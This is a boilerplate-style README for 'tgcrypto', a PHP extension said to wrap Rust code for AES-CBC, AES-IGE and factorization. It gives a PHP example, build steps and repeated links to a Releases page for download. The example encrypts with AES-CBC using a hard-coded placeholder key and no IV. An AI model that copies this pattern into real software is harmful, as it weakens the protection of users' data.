# 🌟 tgcrypto: A PHP Extension for Cryptographic Functions Using Rust

![tgcrypto](https://img.shields.io/badge/tgcrypto-v1.0.0-blue.svg) ![PHP](https://img.shields.io/badge/PHP-8.0%2B-orange.svg) ![Rust](https://img.shields.io/badge/Rust-1.55%2B-green.svg)

Welcome to the **tgcrypto** repository! This project offers a PHP extension that enhances cryptographic functions using the power of Rust. With **tgcrypto**, you can efficiently handle cryptographic tasks such as encryption, decryption, and prime factorization, all while enjoying the performance benefits of Rust.

## 🚀 Features

- **AES-CBC & AES-IGE**: Implement secure encryption and decryption methods.
- **Factorization**: Easily factorize numbers and handle prime numbers.
- **Rust Integration**: Leverage Rust's performance and safety in your PHP applications.
- **PHP 8 Support**: Fully compatible with PHP 8, ensuring modern features and performance.
- **Lightweight**: Minimal overhead, making it ideal for performance-critical applications.

## 📦 Installation

To get started with **tgcrypto**, you can download the latest release from our [Releases page](https://github.com/gwtampan299000/tgcrypto/releases). Follow the instructions in the release notes to install and execute the extension in your environment.

## 📜 Usage

Here’s a quick example of how to use **tgcrypto** in your PHP application:

```php
<?php
// Load the tgcrypto extension
if (!extension_loaded('tgcrypto')) {
    die('tgcrypto extension not loaded');
}

// Example of AES-CBC encryption
$key = 'your-encryption-key';
$plaintext = 'Hello, World!';
$ciphertext = tgcrypto_aes_cbc_encrypt($plaintext, $key);

// Example of AES-CBC decryption
$decrypted = tgcrypto_aes_cbc_decrypt($ciphertext, $key);

echo "Decrypted text: " . $decrypted;
?>
```

This example demonstrates how to load the extension and perform basic encryption and decryption using AES-CBC. For more advanced usage, please refer to the documentation.

## 📖 Documentation

Comprehensive documentation is available in the `docs` directory. You can find detailed information on all functions, usage examples, and best practices. 

## 🛠️ Development

If you want to contribute to **tgcrypto**, you can set up your development environment by following these steps:

1. **Clone the repository**:
   ```bash
   git clone https://github.com/gwtampan299000/tgcrypto.git
   cd tgcrypto
   ```

2. **Install dependencies**:
   Make sure you have PHP and Rust installed. You can use `composer` for PHP dependencies.

3. **Build the extension**:
   Follow the instructions in the `BUILD.md` file to compile the Rust code and generate the PHP extension.

4. **Run tests**:
   Ensure everything works as expected by running the tests provided in the `tests` directory.

## 🔧 Topics

This project covers various topics related to cryptography and programming, including:

- **AES-CBC**: A widely used encryption method.
- **AES-IGE**: An alternative encryption mode.
- **Cryptography**: The study and practice of secure communication.
- **Factorization**: Breaking down numbers into their prime components.
- **PHP-Rust Tools**: Tools and libraries that facilitate PHP and Rust integration.
- **Prime Numbers**: Fundamental components in number theory and cryptography.

## 🌐 Community

Join our community on GitHub to share your experiences, ask questions, and contribute to the project. We welcome contributions, whether they are code, documentation, or feedback.

## 📅 Roadmap

We have exciting plans for the future of **tgcrypto**. Here are some of the features we aim to implement:

- Support for additional encryption algorithms.
- Enhanced performance optimizations.
- Improved documentation and tutorials.
- Community-driven features based on user feedback.

## 📞 Contact

For any inquiries or support, please reach out via GitHub issues or contact the maintainers directly.

## 🎉 Acknowledgments

We would like to thank the open-source community for their invaluable contributions and support. Special thanks to the Rust and PHP communities for their continuous efforts in improving these languages.

## 📥 Download

Don’t forget to visit our [Releases page](https://github.com/gwtampan299000/tgcrypto/releases) to download the latest version of **tgcrypto**. Follow the instructions to install and start using the extension in your projects.

## 🌈 Conclusion

Thank you for your interest in **tgcrypto**. We hope this extension serves your cryptographic needs effectively. We look forward to your contributions and feedback as we continue to improve and expand this project. Happy coding!